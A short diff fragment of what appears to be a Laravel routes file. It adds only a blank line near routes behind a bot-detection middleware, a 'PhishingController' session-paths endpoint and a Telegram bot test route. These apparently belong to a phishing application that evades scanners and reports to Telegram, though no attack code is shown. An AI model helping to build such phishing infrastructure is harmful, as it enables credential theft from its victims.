@@ -53,6 +53,7 @@ Route::middleware([\App\Http\Middleware\BotDetectionMiddleware::class])->group(f
 // Non-blocked API internal call
 Route::get('/session-paths', [PhishingController::class, 'getSessionPaths']);
 
+
 Route::get('/test-telegram', function () {
     $token = env('TELEGRAM_BOT_TOKEN');
     $chatId = env('TELEGRAM_CHAT_ID');
